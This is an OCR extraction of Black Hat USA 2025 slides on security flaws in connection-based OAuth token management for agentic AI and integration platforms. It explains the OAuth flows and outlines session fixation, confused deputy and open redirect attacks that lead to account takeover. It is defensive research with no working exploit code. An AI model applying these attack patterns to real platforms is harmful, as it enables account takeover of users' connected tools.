---
title: "Back to the Future Hacking and Securing Connection-based OAuth Architectures in Agentic AI and Integration Platforms"
speakers: ["Kaixuan Luo", "Xianbo Wang", "Adonis Fung", "Yanxiang Bi", "Wing Cheong Lau"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Kaixuan Luo&Xianbo Wang&Adonis Fung&Yanxiang Bi&Wing Cheong Lau_Back to the Future Hacking and Securing Connection-based OAuth Architectures in Agentic AI and Integration Platforms.pdf"
pages: 122
sha256: "f11c9cc141d87fa112f867c927d193cb1d2758a79795961a7ac5e3610d7d5d3f"
text_chars: 69699
ocr_pages: 1
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T22:56:57Z"
---
# Back to the Future Hacking and Securing Connection-based OAuth Architectures in Agentic AI and Integration Platforms

**Speakers:** Kaixuan Luo, Xianbo Wang, Adonis Fung, Yanxiang Bi, Wing Cheong Lau  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Kaixuan Luo&Xianbo Wang&Adonis Fung&Yanxiang Bi&Wing Cheong Lau_Back to the Future Hacking and Securing Connection-based OAuth Architectures in Agentic AI and Integration Platforms.pdf` (122 pages)

## Slide 1

# Back to the Future: Hacking & Securing Connection-based OAuth Architectures in Agentic AI & Integration Platforms

**<u>Kaixuan Luo</u>**<sup>**1**</sup> , Xianbo Wang<sup>1</sup> , Adonis Fung<sup>2</sup> , Yanxiang Bi<sup>1</sup> , **<u>Wing Cheong Lau</u>** 1 1 The Chinese University of Hong Kong 2 Samsung Research America

#BHUSA  @BlackHatEvents

## Slide 2

# About us

**Kaixuan Luo** PhD Candidate kaixuan@ie.cuhk.edu.hk

**Wing C. Lau** Professor wclau@ie.cuhk.edu.hk

**Adonis Fung** Director of Engineering, Security adonis.fung@samsung.com

**Yanxiang Bi** PhD Candidate by022@ie.cuhk.edu.hk

**Xianbo Wang** PhD Candidate @sanebow

#BHUSA  @BlackHatEvents

2

## Slide 3

# Agenda

**Background:**

   - Integration Platform, Agentic AI Ecosystem

   - OAuth-based delegation of Tool access by Users to Integration Platforms & AI Agents

- The new OAuth-as-a-Service (OaaS) paradigm to ease 3<sup>rd</sup> -party Agent developments

- **Key Concepts behind OaaS:**

   - Technical details of the non-standard, yet increasingly popular, Connection-based OAuth Architectures for realizing OaaS

- **Classic Web Attacks resurrected by Connection-based OAuth:**

   - Cross-Agent/ Cross-Tool/ Cross-User Confused Deputy, Session Fixation, Open Redirect

   - • Mitigations and the Intricacies required to get them right

###### **Real-World Impact:**

- Case Study, Demo and Evaluation

**Reflections and Summary:**

- Key Takeaways

#BHUSA  @BlackHatEvents

3

## Slide 4

### Previously [BHUSA'24]: the Pre-Agentic AI Era

**_Handful of Big-name Integration Platforms_**

**_Many Tools_** _(a.k.a. Integrations)_

**Microsoft Power Automate**

- Users delegate Tool access/control to a handful of Integration Platforms built-by Big-name Service providers.

[BHUSA '24] Kaixuan Luo et al. One Hack to Rule Them All: Pervasive Account Takeovers in Integration Platforms for Workflow Automation, Virtual Voice Assistant, IoT, & LLM Services. <u>https://www.youtube.com/watch?v=qrHEBElig3c</u>

#BHUSA  @BlackHatEvents

4

## Slide 5

### Trending: The Era of Agentic AI

- In the Era of Agentic AI, many 3<sup>rd</sup> -party developers will build various Agents to serve their customers.

- • Customers will delegate Tool access/control to these different 3<sup>rd</sup> -party Agents.

**_Many Tools_** _(a.k.a. Integrations)_

Many 3 rd -party Agents
built by many 3 rd -party developers
……
……

#BHUSA  @BlackHatEvents

5

## Slide 6

### The Emergence of Agentic AI Platforms

- Emerging Agentic AI Platforms are busy positioning themselves to facilitate 3<sup>rd</sup> -party Agent developments.

**_Many Tools_** _(a.k.a. Integrations)_

Agentic AI Platforms
Microsoft
Copilot Studio
Many, many 3 rd -party Agents

Build
rd -party Agents
……
……

#BHUSA  @BlackHatEvents

6

## Slide 7

###### User delegates Tool access/control to Integration Platforms and Many Agents

**_Handful of Big-name Integration Platforms_**

**_Many Tools_** _(a.k.a. Integrations)_

Microsoft
Power Automate

**_Agentic AI Platforms_ Microsoft Copilot Studio** **_Build Many, many 3_**<sup>**_rd_**</sup> **_-party Agents_** …… ……

#BHUSA  @BlackHatEvents

7

## Slide 8

###### <u>OAuth</u> – the industry standard for delegating Tool access/control to Integration Platforms / Agents

OAuth-based Account Linking in Integration Platforms [BHUSA'24] **_Integration Tools Platform_**

Store & Manage  Access tokens
tokens

An Integration Platform manages Tool-access Tokens for every end-user using <u>OAuth</u> – the industry standard

[BHUSA '24] Kaixuan Luo et al. One Hack to Rule Them All: Pervasive Account Takeovers in Integration Platforms for Workflow Automation, Virtual Voice Assistant, IoT, & LLM Services. <u>https://www.youtube.com/watch?v=qrHEBElig3c</u>

⭐ 3<sup>rd</sup> -party Agents still need OAuth tokens ! **_3_**<sup>**_rd_**</sup> **_-party Tools Agents Every Agent needs its per-Tool tokens Access tokens_** <u>OAuth</u> remains indispensable for Users to delegate Tool Access / Control to 3<sup>rd</sup> -party Agents

#BHUSA  @BlackHatEvents

8

## Slide 9

###### RECAP: BHUSA '24 Findings on OAuth-related Vulnerabilities w/ Integration Platforms

OAuth-based Account Mis-Linking **_Big name Integration Platforms Tools_**

Access tokens
Store & Manage
tokens
Integration Platform
manages OAuth tokens
for its end-user

- Discovered 3 Types of new a>acks via (Forced) Account Mis-Linking

- Þ **1-Click** Account Takeover or Privacy Leakage of Tools

- **24** Major PlaIorms in Smart Homes, Voice Assistants, Workflow AutomaOon, LLM-supporOng-Plugins, found to be Vulnerable 9

#BHUSA  @BlackHatEvents

## Slide 10

## Paradigm Shift towards OAuth-as-a-Service

**_Many Agents_**

Tools

⭐ OAuth- as-a- Service **_3rd-party Token Manager Tools_** **_Agents (_** **_run by Agentic AI Platform)_**

Every Agent needs
Every Agent
its OAuth tokens OAuth tokens needs its tokensits tokens
…
…………
…

**_Every Agent Store & Manage needs its tokensits tokens tokens_**

The OAuth-as-a-Service architecture <u>offloads Complex, Error-prone OAuth Token Management</u> from 3<sup>rd</sup> -party Agent developers to "Token Manager" run by Agentic AI Platforms

Need to Relieve MANY 3rd-party Agent Developers from <u>OAuth Intricacies !</u>

#BHUSA  @BlackHatEvents

10

## Slide 11

#### OAuth-as-a-Service in Microsoft: Two use cases

###### **Agentic AI Platforms**

Microsoft

**Microsoft Copilot Studio** **_Build Agents_**

**Azure AI Bot Service**

**_Build Highly-customized Agents_**

###### **I. Bot Framework Token Service**

**_Token Manager_**

###### **Integration Platforms**

**Microsoft Copilot Studio**

**Microsoft Microsoft Power Automate/Apps Copilot Studio** **_Microsoft-Managed Platforms_**

**Azure Azure Logic Apps API Management** **_Build Custom Platforms_**

###### **II. Credential Manager**

**(formerly known as** **_Azure Token Store_ )**

**_Token Manager_**

#BHUSA  @BlackHatEvents

11

## Slide 12

## OAuth-as-a-Service across Industry

**Agent Auth / AI Gateway Solutions**

"AI Tool-calling Platform" "AI Agent Toolset"

**…**

"AI App Development Platform"

Agents Token Manager Tools
3 rd -party 1 st -party agents  Custom
Managed Managed (Pre-built)
(Custom) owned by platform
Custom
Custom
SDK or Dev Portal
Every developer can build Custom Agents & Tools with vendor's SDK/Developer portal !

Tools
Managed (Pre-built) Custom
Custom
Custom

**Use Cases:**

#BHUSA  @BlackHatEvents

12

## Slide 13

###### OAuth-as-a-Service with Model Context Protocol (MCP)

###### MCP Authorization

⭐<sup>MCPDownstreamToolAuthorization</sup> **(** **_e.g.,_ out-of-band / URL elicitation, Draft Proposal by )**

**_MCP Client One OAuth-enabled (e.g., hosted by MCP Server Claude Desktop) per Tool_**

**_MCP Client_**

**_A single MCP Server w/ Token Manager Tools for multiple tools_**

**_Store & Manage tool tokens_**

**_Claude Desktop_**

<u>https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization</u>

**_Offload Store & Manage tool tokens to tool tokens Token Manager_**

**_Claude Desktop_**

<u>https://github.com/modelcontextprotocol/modelcontextprotocol/pull/887</u>

#BHUSA  @BlackHatEvents

13

## Slide 14

###### Security Challenge for Realizing OAuth-as-a-Service

**_Integration Platform_**

BEFORE:

**_Tools_**

⭐ Under OAuth- as-a- Service **_3rd-party Token Manager Tools_** **_Agents (_** **_run by Agentic AI Platform)_**

Access tokens

###### **_Store & Manage tokens_**

- An Integration Platform can "mostly" follow OAuth-standards (except problems in BHUSA'24) to:

- `o` implement and take up the role of OAuth Client `o` manage Tool-access Tokens for every end-user served by the platform

**_Every Agent Store & Manage needs its tokens tokens_**

**Microsoft Copilot Studio**

   - Under OAuth-as-a-Service, the functions of OAuth Client are now split between 3<sup>rd</sup> -party Agents and the Token Manager run by Agentic AI Platform

-

- BUT such "split" is out of the scope of OAuth standards

- ⇒ Numerous Proprietary & Error-prone realizations in practice

#BHUSA  @BlackHatEvents

14

## Slide 15

##### Our NEW Findings on the (In)Security of Agentic AI and Integration Platforms

###### **# Vendors**

**7**

**7 Agentic AI or Integration Platforms** …

Power Platform
/ Copilot Studio / Azure

###### **# Vulnerable Instances**

**4 Types of "Back to the Future" A6acks 5 Session Fixation**

**3 New A6ack Scenarios**

7 Cross-user

A  malicious user  of a benign agent
targeting a benign user of
the same agent

**2 Open Redirect**

**9 Cross-agent** A **_malicious agent_** targeting a benign agent

**3 Client ID Confusion Confused Deputy 6 COAT** (Cross-tool OAuth Account Takeover)

6 Cross-tool
A  malicious tool
targeting a benign tool

Security Impact

**_Account Takeover_** of an end-user's tool w/o explicit consent

Classic Web Attacks which had been carefully addressed by OAuth standards have now **_remanifested_** due to the emerging, proprietary, yet-increasingly popular OAuth-as-a-Service Architectures in Agentic AI and Integration Platforms !

#BHUSA  @BlackHatEvents

15

## Slide 16

## OAuth-as-a-Service: Coordination

###### Traditional OAuth

Agent Tools
OAuth Client Authorization Server
Need & Manage
tokens
OAuth
/GetFile
Resource Server

###### **OAuth Roles**

- **OAuth Client:** manage **_tokens_**

- **Authorization Server:** issue **_tokens_**

- **Resource Server:** consume **_tokens_**

#BHUSA  @BlackHatEvents

16

## Slide 17

## OAuth-as-a-Service: Coordination

###### Traditional OAuth

⭐

###### OAuth-as-a-Service

**_Agent Tools_ OAuth Client Authoriza5on Server**

###### **_Need & Manage tokens_**

OAuth
/GetFile
Resource Server

###### **OAuth Roles**

- **OAuth Client:** manage **_tokens_**

- • **Authorization Server:** issue **_tokens_**

- • **Resource Server:** consume **_tokens_**

Agent Token Manager Tools
OAuth Client Authorization Server
Need tokens Manage tokens

**How to Track state / Communicate between Agent & Token Manager**

#BHUSA  @BlackHatEvents

16

## Slide 18

## OAuth-as-a-Service: Potential Solutions

###### "Brokered" OAuth

**OAuth Client** **_Agent Token Manager_**

**Authorization Server**

**_Tools_**

A
B
C

#BHUSA  @BlackHatEvents

17

## Slide 19

## OAuth-as-a-Service: Potential Solutions

###### "Brokered" OAuth

**OAuth Client Authorization Server** **_Agent Token Manager Tools_** ß **OAuth** à **OAuth Client Authorization Server**

A
1
2 B
Token Token
3 C
(Broker) (Original)
1 A
2 B
3 C

- Agent implements OAuth Client, fetching/ storing/ refreshing the **_tokens_** from Token Manager ( _a.k.a._ "OAuth Broker")

- • OAuth responsibilities remain on Agent side

#BHUSA  @BlackHatEvents

17

## Slide 20

## OAuth-as-a-Service: Potential Solutions

"Brokered" OAuth

⭐

"OAuth Connection"

**OAuth Client Authorization Server** **_Agent Token Manager Tools_** ß **OAuth** à **OAuth Client Authoriza5on Server**

A 1 2 B **_Token Token_** 3 C **_(Broker) (Original)_** 1 A 2 B 3 C

**_Agent_**

**OAuth Client Authorization Server** **_Token Manager Tools_**

A B C

- Agent implements OAuth Client, fetching/ storing/ refreshing the **_tokens_** from Token Manager ( _a.k.a._ "OAuth Broker")

- • OAuth responsibilities remain on Agent side

#BHUSA  @BlackHatEvents

17

## Slide 21

## OAuth-as-a-Service: Potential Solutions

"Brokered" OAuth

⭐

"OAuth Connection"

**OAuth Client Authorization Server** **_Agent Token Manager Tools_** ß **OAuth** à **OAuth Client Authoriza5on Server**

A 1 2 B **_Token Token_** 3 C **_(Broker) (Original)_** 1 A 2 B 3 C

- Agent implements OAuth Client, fetching/ storing/ refreshing the **_tokens_** from Token Manager ( _a.k.a._ "OAuth Broker")

- • OAuth responsibilities remain on Agent side

**OAuth Client Authoriza5on Server** **_Agent Token Manager Tools_** ß **Proprietary** à

A
Connection#1
Connection#2 B
Connection#3 C
Connection ID Token
Connection#1 A
B
Connection#2
C
Connection#3

- Token Manager handles tokens' lifecycle for Agent

- • Agent keeps non-secret **_Connection IDs_** , instead of storing secrets (tokens)

- • OAuth logic fully abstracted away on Agent side

#BHUSA  @BlackHatEvents

17

## Slide 22

## OAuth Connection

###### **_Tool_**

###### **_Connection = <tool, agent, user>_**

Token Manager
Agent
Connec&on
{
User
Connec&on ID , (Primary Key)
Tool ID,
Agent ID,
User ID,
OAuth Token
}

OAuth Connection: A **_preconfigured handle_** for a **_managed OAuth token_**

- issued by a particular _<u>tool</u>_

- to a specific _<u>agent</u>_

- • for a specific _<u>end-user</u>_

#BHUSA  @BlackHatEvents

18

## Slide 23

## OAuth Protocol Flow (in Traditional OAuth)

###### **OAuth Roles**

- **OAuth Client:** manage **_tokens_**

- • **Authorization Server:** issue **_tokens_**

- • **Resource Server:** consume **_tokens_**

- v **_Browser:_** _user interaction_

###### **_Browser_**

###### **OAuth Client**

Agent Backend

###### **Authoriza5on Server**

###### **_Tool_**

OAuth

Resource Server
Access
/GetFile API

_OAuth 2.0 Authorization Code Grant Flow_

#BHUSA  @BlackHatEvents

19

## Slide 24

## OAuth Protocol Flow (in Traditional OAuth)

###### **OAuth Roles**

- **OAuth Client:** manage **_tokens_**

- • **Authorization Server:** issue **_tokens_**

**_Browser_**

###### **OAuth Client**

###### **_Agent Backend_**

###### **Authoriza5on Server**

###### **_Tool_**

- **Resource Server:** consume **_tokens_**

- v **_Browser:_** _user interaction_

Resource Server
Access
/GetFile API

_OAuth 2.0 Authorization Code Grant Flow_

#BHUSA  @BlackHatEvents

19

## Slide 25

## OAuth Protocol Flow (in Traditional OAuth)

###### **Authorization Server**

###### **OAuth Client**

###### **OAuth Roles**

- **OAuth Client:** manage **_tokens_**

- • **Authorization Server:** issue **_tokens_**

- • **Resource Server:** consume **_tokens_**

- v **_Browser:_** _user interaction_ **OAuth URL**

Tool
Agent Backend
① Start OAuth
② /authorize?redirect_uri=/callback
Resource Server
Access
/GetFile API

**_Browser_**

_OAuth 2.0 Authorization Code Grant Flow_

#BHUSA  @BlackHatEvents

19

## Slide 26

## OAuth Protocol Flow (in Traditional OAuth)

###### **OAuth Roles**

- **OAuth Client:** manage **_tokens_**

- • **Authorization Server:** issue **_tokens_**

- • **Resource Server:** consume **_tokens_**

- v **_Browser:_** _user interaction_ **OAuth URL**

**_Browser_**

###### **OAuth Client**

**_Agent Backend_** ① Start OAuth

② /authorize?redirect_uri=/callback

###### **Authorization Server**

Tool

Authorize

Resource Server
Access
/GetFile API

_OAuth 2.0 Authorization Code Grant Flow_

#BHUSA  @BlackHatEvents

19

## Slide 27

## OAuth Protocol Flow (in Traditional OAuth)

###### **OAuth Roles**

- **OAuth Client:** manage **_tokens_**

- • **Authorization Server:** issue **_tokens_**

- • **Resource Server:** consume **_tokens_**

- v **_Browser:_** _user interaction_ **OAuth URL**

**_Browser_**

###### **Authorization Server**

###### **OAuth Client**

Tool

**_Agent Backend_** ① Start OAuth

Authorize
Resource Server
Access
/GetFile API

- ② /authorize?redirect_uri=/callback

_OAuth 2.0 Authorization Code Grant Flow_

#BHUSA  @BlackHatEvents

19

## Slide 28

## OAuth Protocol Flow (in Traditional OAuth)

###### **OAuth Roles**

- **OAuth Client:** manage **_tokens_**

- • **Authorization Server:** issue **_tokens_**

- • **Resource Server:** consume **_tokens_**

- v **_Browser:_** _user interaction_ **OAuth URL**

**_Browser_**

###### **OAuth Client**

**_Agent Backend_** ① Start OAuth

② /authorize?redirect_uri=/callback

###### **Authoriza5on Server**

Tool

Authorize

Resource Server
Access
/GetFile API

_OAuth 2.0 Authorization Code Grant Flow_

#BHUSA  @BlackHatEvents

19

## Slide 29

## OAuth Protocol Flow (in Traditional OAuth)

###### **OAuth Roles**

- **OAuth Client:** manage **_tokens_**

- • **Authorization Server:** issue **_tokens_**

- • **Resource Server:** consume **_tokens_**

- v **_Browser:_** _user interaction_

**_Browser_**

**OAuth URL** **_Redirect_**

###### **OAuth Client**

**_Agent Backend_** ① Start OAuth

- ② /authorize?redirect_uri=/callback

- ③ /callback?code= **_code_**

###### **Authorization Server**

**_Tool_**

Authorize

Resource Server
Access
/GetFile API

_OAuth 2.0 Authorization Code Grant Flow_

#BHUSA  @BlackHatEvents

19

## Slide 30

## OAuth Protocol Flow (in Traditional OAuth)

###### **OAuth Roles**

- **OAuth Client:** manage **_tokens_**

- • **Authorization Server:** issue **_tokens_**

- • **Resource Server:** consume **_tokens_**

- v **_Browser:_** _user interaction_

**_Browser_**

**OAuth URL** **_Redirect_**

###### **Authoriza5on Server**

###### **OAuth Client**

**_Tool_**

**_Agent Backend_** ① Start OAuth

- &state= **_state_**

- ② /authorize?redirect_uri=/callback

Authorize

- & state= **_state_**

- ③ /callback?code= **_code_**

Resource Server
Access
/GetFile API

_OAuth 2.0 Authorization Code Grant Flow_

#BHUSA  @BlackHatEvents

19

## Slide 31

## OAuth Protocol Flow (in Traditional OAuth)

###### **OAuth Client**

###### **Authorization Server**

OAuth Roles
•
OAuth Client:  manage  tokens Browser Agent Backend Tool
•
Authorization Server:  issue  tokens ① Start OAuth
•
Resource Server:  consume  tokens
v Browser:  user interaction OAuth URL ② /authorize?redirect_uri=/callback &state= state
Authorize
Redirect ③ /callback?code= code & state= state
④ /token with  code
Code
Exchange
⑤ access  token
Resource Server
Access
/GetFile API

_OAuth 2.0 Authorization Code Grant Flow_

#BHUSA  @BlackHatEvents

19

## Slide 32

## OAuth Protocol Flow (in Traditional OAuth)

###### **Authorization Server**

###### **OAuth Client**

###### **OAuth Roles**

- **OAuth Client:** manage **_tokens_**

- • **Authorization Server:** issue **_tokens_**

- • **Resource Server:** consume **_tokens_**

- v **_Browser:_** _user interaction_

Tool

**_Browser_**

**_Agent Backend_** ① Start OAuth

① Start OAuth
user session
&state= state
② /authorize?redirect_uri=/callback
Authorize
& state= state
③ /callback?code= code
user session
④ /token with  code
Code
Exchange
⑤ access  token
token  linked to
user's identity Resource Server
Access
/GetFile API

**OAuth URL** **_Redirect_**

_OAuth 2.0 Authorization Code Grant Flow_

#BHUSA  @BlackHatEvents

19

## Slide 33

## OAuth Protocol Flow (in Traditional OAuth)

###### **Authoriza5on Server**

###### **OAuth Client**

###### **OAuth Roles**

- **OAuth Client:** manage **_tokens_**

- • **Authorization Server:** issue **_tokens_**

- • **Resource Server:** consume **_tokens_**

- v **_Browser:_** _user interaction_ **OAuth URL** **_Redirect_**

**_Tool_**

**_Browser_**

**_Agent Backend_** ① Start OAuth **_user session_** Generate **_state_** , bound to **_user session_**

&state= state
② /authorize?redirect_uri=/callback
Authorize
& state= state
③ /callback?code= code
user session
Verify  state -
user session  binding ④ /token with  code
Code
Exchange
⑤ access  token
token  linked to
user's identity Resource Server
Access
/GetFile API

_OAuth 2.0 Authorization Code Grant Flow_

#BHUSA  @BlackHatEvents

19

## Slide 34

## Retrofitting "Connection" to OAuth

**_ConnecCon = <tool, agent, user>_**

###### **Pre-OAuth**

OAuth

**Post-OAuth** (Runtime)

**OAuth Client**

**_Agent_**

Agent Token Manager
ß Proprietary à

**Authoriza5on Server**

Tools

#BHUSA  @BlackHatEvents

20

## Slide 35

## Retrofitting "Connection" to OAuth

**_ConnecCon = <tool, agent, user>_**

###### **Pre-OAuth**

Generate a **_placeholder connection_**

**OAuth Client**

**_Agent_**

**_Token Manager_**

ß **Proprietary** à **/AddConnection**

**Authoriza5on Server**

**_Tools_**

**Pre-OAuth**

**OAuth**

**Post-OAuth** (RunOme)

#BHUSA  @BlackHatEvents

20

## Slide 36

## Retrofitting "Connection" to OAuth

###### **_Connection = <tool, agent, user>_**

###### **Pre-OAuth**

Generate a **_placeholder connection_**

- _Tool ID_ : identify the tool

- - _User ID_ : identify the end-user

- _API KEY_ : identify & authenticate each agent (developer)

**OAuth**

**Post-OAuth** (Runtime)

**OAuth Client**

**_Agent_**

**_Token Manager_**

ß

à

**Proprietary**

/AddConnection
• Tool ID, User ID
+ API KEY

###### **Pre-OAuth**

**Authoriza5on Server**

###### **_Tools_**

#BHUSA  @BlackHatEvents

20

## Slide 37

## Retrofitting "Connection" to OAuth

**OAuth Client**

**Authoriza5on Server**

###### **_Connection = <tool, agent, user>_**

###### **Pre-OAuth**

Generate a **_placeholder connection_**

   - _Tool ID_ : identify the tool

   - _User ID_ : identify the end-user

- _API KEY_ : identify & authenticate each agent (developer)

- Return Connection ID & **OAuth URL**

- **OAuth**

###### **Pre-OAuth**

###### **_Agent_**

**_Token Manager_**

ß **Proprietary /AddConnection**

à

- Tool ID, User ID **_Connection ID | Token_**

- + API KEY Connection#1

- _Connection ID_ =#1

- _OAuth URL=/authorize_

###### **_Tools_**

**Post-OAuth** (RunOme)

#BHUSA  @BlackHatEvents

20

## Slide 38

## Retrofitting "Connection" to OAuth

**OAuth Client**

**Authoriza5on Server**

###### **_ConnecCon = <tool, agent, user>_**

###### **Pre-OAuth**

- Generate a **_placeholder connection_** - _Tool ID_ : identify the tool - _User ID_ : identify the end-user - _API KEY_ : identify & authenticate each agent (developer)

- Return Connection ID & **OAuth URL**

- **OAuth**

**_Agent_**

**_Token Manager_** ß **Proprietary** à **/AddConnection**

**Pre-OAuth**

- Tool ID, User ID **_Connection ID | Token_**

- + API KEY Connection#1 • _Connection ID_ =#1 • _OAuth URL=/authorize_ … …

**OAuth**

**_Tools_**

- Establish an **_OAuth flow_**

###### **Post-OAuth** (Runtime)

#BHUSA  @BlackHatEvents

20

## Slide 39

## Retrofitting "Connection" to OAuth

**OAuth Client**

**Authoriza5on Server**

###### **_Connection = <tool, agent, user>_**

###### **Pre-OAuth**

Generate a **_placeholder connection_**

- _Tool ID_ : identify the tool

- _User ID_ : identify the end-user

- _API KEY_ : identify & authenticate each agent (developer) Return Connection ID & **OAuth URL OAuth**

- Establish an **_OAuth flow_**

**_Agent_**

**_Token Manager_**

ß **Proprietary /AddConnection**

à

**Pre-OAuth**

• Tool ID, User ID **_Connection ID | Token_** + API KEY Connection#1 • _Connec6on ID_ =#1 • _OAuth URL=/authorize_ … … **_Connection ID | Token_** Connection#1

**OAuth**

**_Tools_**

- Bind resulting token to the Connection

###### **Post-OAuth** (RunOme)

#BHUSA  @BlackHatEvents

20

## Slide 40

## Retrofitting "Connection" to OAuth

###### **_ConnecCon = <tool, agent, user>_**

###### **Pre-OAuth**

Generate a **_placeholder connection_**

- _Tool ID_ : identify the tool

- _User ID_ : identify the end-user

- _API KEY_ : identify & authenticate each agent (developer) Return Connection ID & **OAuth URL OAuth**

- Establish an **_OAuth flow_**

- Bind resulting token to the Connection

**Authoriza5on Server**

**OAuth Client Authoriza5on Server** **_Agent Token Manager Tools_** ß **Proprietary** à **/AddConnection**

**Pre-OAuth**

• Tool ID, User ID **_Connection ID | Token_** + API KEY Connection#1 • _Connection ID_ =#1 • _OAuth URL=/authorize_ … **OAuth** … **_Connection ID | Token_** Connection#1 **Post-OAuth Pattern 1**

###### **Post-OAuth** (RunOme)

Use Connection to **_make authorized API calls_**

#BHUSA  @BlackHatEvents

20

## Slide 41

## Retrofitting "Connection" to OAuth

OAuth Client Authoriza5on Server
Agent Token Manager Tools
ß Proprietary à
/AddConnection
• Tool ID, User ID Connection ID | Token
+ API KEY Connection#1
• Connec6on ID =#1
• OAuth URL=/authorize
…
…
Connection ID | Token
Connection#1
/GetToken
• Connection ID =#1
+ API KEY
Resource Server
/GetFile

###### **_Connection = <tool, agent, user>_**

###### **Pre-OAuth**

- Generate a **_placeholder connection_** - _Tool ID_ : identify the tool - _User ID_ : identify the end-user - _API KEY_ : identify & authenticate each agent (developer)

- Return Connection ID & **OAuth URL**

- **OAuth**

###### **Pre-OAuth**

OAuth
Post-OAuth
Pa:ern 1

- Establish an **_OAuth flow_**

- Bind resulting token to the Connection

###### **Post-OAuth** (RunOme)

Use Connection to **_make authorized API calls_**

- **[Pattern 1]** Agent calls API w/ cached tokens

#BHUSA  @BlackHatEvents

20

## Slide 42

## Retrofitting "Connection" to OAuth

###### **_ConnecCon = <tool, agent, user>_**

###### **Pre-OAuth**

Generate a **_placeholder connection_**

- _Tool ID_ : identify the tool

- _User ID_ : identify the end-user

- _API KEY_ : identify & authenticate each agent (developer) Return Connection ID & **OAuth URL OAuth**

- Establish an **_OAuth flow_**

- Bind resulting token to the Connection

**Authoriza5on Server**

**OAuth Client Authoriza5on Server** **_Agent Token Manager Tools_** ß **Proprietary** à **/AddConnection**

**Pre-OAuth**

- Tool ID, User ID **_Connection ID | Token_**

- + API KEY Connection#1 • _Connection ID_ =#1 • _OAuth URL=/authorize_ … …

- **_Connection ID | Token_** Connection#1

**OAuth Post-OAuth Pattern 2**

###### **Post-OAuth** (RunOme)

Use Connection to **_make authorized API calls_**

#BHUSA  @BlackHatEvents

21

## Slide 43

## Retrofitting "Connection" to OAuth

OAuth Client Authoriza5on Server
Agent Token Manager Tools
ß Proprietary à
/AddConnection
Pre-OAuth
• Tool ID, User ID Connection ID | Token
+ API KEY Connection#1
• Connec6on ID =#1
• OAuth URL=/authorize
…
OAuth …
Connection ID | Token
Connection#1
Post-OAuth
/GetFile
Resource Server
Pa:ern 2
• Connec6on ID=#1
+ API KEY /GetFile
Token Manager may adopt
either options to facilitate API calls

###### **_Connection = <tool, agent, user>_**

###### **Pre-OAuth**

- Generate a **_placeholder connection_** - _Tool ID_ : identify the tool - _User ID_ : identify the end-user - _API KEY_ : identify & authenticate each agent (developer)

- Return Connection ID & **OAuth URL**

- **OAuth**

**Pre-OAuth**

**OAuth Post-OAuth Pa:ern 2**

- Establish an **_OAuth flow_**

- Bind resulting token to the Connection

###### **Post-OAuth** (RunOme)

Use Connection to **_make authorized API calls_** _-_ **[Pattern 2]** Token Manager forwards Agent's API call w/ tokens attached

#BHUSA  @BlackHatEvents

21

## Slide 44

### Connection-based OAuth: Normal Coordination

OAuth Client Authoriza5on Server
ß Proprietary à
Browser Agent Backend Token Manager Tool

#BHUSA  @BlackHatEvents

22

## Slide 45

### Connection-based OAuth: Normal Coordination

OAuth Client Authoriza5on Server
ß Proprietary à
Browser Agent Backend Token Manager Tool
① Start OAuth
user session
state= state
② /authorize?
Authorize
& state= state
③ /callback?code= code
④ /token with  code
Code
Exchange
⑤ access  token
token  linked to
user's connection

#BHUSA  @BlackHatEvents

22

## Slide 46

### Connection-based OAuth: Normal Coordination

OAuth Client Authoriza5on Server
ß Proprietary à
Browser Agent Backend Token Manager Tool
① Start OAuth
user session /AddConnection
Generate  connection ,
bound to  user's identity
Generate  state ,
bound to  connection
OAuth URL
=/authorize
state= state
② /authorize?
Authorize
& state= state
③ /callback?code= code
④ /token with  code
Code
Exchange
⑤ access  token
token  linked to
user's connection

#BHUSA  @BlackHatEvents

22

## Slide 47

### Connection-based OAuth: Normal Coordination

###### **Agent's Perspec,ve**

- Query Token Manager to generate an **_OAuth URL_** [②]

- • **_<u>Send the OAuth URL to user</u>_**

- User completes OAuth

- Token sent to **_Token Manager_**

###### **Token Manager's Perspective**

- Connection manifests as an **_authorization session_** , tracked via **_state_** parameter in OAuth flow

###### **End-user's Perspec,ve**

- **_Same user experience_** as in traditional OAuth

- "Proprietary" part is **_opaque_**

**Authoriza5on Server**

###### **OAuth Client**

ß Proprietary à
Agent Backend Token Manager

Tool

**_Browser_**

Agent Backend

/AddConnection
Generate  connection ,
bound to  user's identity
Generate  state ,
bound to  connection
OAuth URL
=/authorize

/AddConnection
Generate  connection ,
bound to  user's identity
Generate  state ,
bound to  connection
OAuth URL
=/authorize
Authorize
state= state
④ /token with  code
Code
Exchange
⑤ access  token
token  linked to
user's connection

- ① Start OAuth

**_user session_**

- **state=** **_state_**

- ② **/authorize?**

- & state= **_state_**

- ③ /callback?code= **_code_**

#BHUSA  @BlackHatEvents

22

## Slide 48

## Attack Type 1 – Session Fixation

###### **_Tool_**

###### **_ConnecCon = <tool, agent, user>_**

Token Manager
Agent
Connec&on
User

###### **Expectation (End-user's Perspective):**

`o` **_My_** authorization for an agent should not go to another **_user_** served by the same agent.

**Reality:**

`o` **Cross-user Session Fixation**

#BHUSA  @BlackHatEvents

23

## Slide 49

## Attack Type 1 – Session Fixation

###### **_Tool_**

###### **_Connection = <tool, agent, user>_**

Token Manager
Agent
Connec&on
User

###### **Expectation (End-user's Perspective):**

o
My  authorization for an agent should not go to another  user
served by the same agent.
①sessionID=attacker
②Log in
under sessionID
o Cross-user Session Fixation Attacker Victim
③ Logged in
23 as Vic&m #BHUSA  @BlackHatEvents

**Reality:** `o` **Cross-user Session Fixation**

23

## Slide 50

## Session Fixation: Attack

#BHUSA  @BlackHatEvents

24

## Slide 51

## Session Fixation: Attack

① Start OAuth
Generate  connection ,
authorization session
… Generate  state ,
② /authorize? state= state bound to  connection

#BHUSA  @BlackHatEvents

24

## Slide 52

## Session Fixation: Attack

Authorization Server

###### **OAuth Client**

Attacker ' s Victim ' s
Browser Browser Agent Backend Token Manager Tool
① Start OAuth
Generate  connection ,
authorization session
… Generate  state ,
② /authorize? state= state bound to  connection

#BHUSA  @BlackHatEvents

24

## Slide 53

## Session Fixation: Attack

• Attacker initiates OAuth,

OAuth Client Authorization Server
Attacker ' s Victim ' s
Browser Browser Agent Backend Token Manager Tool
① Start OAuth
Generate  connection ,
attacker's session
bound to  attacker
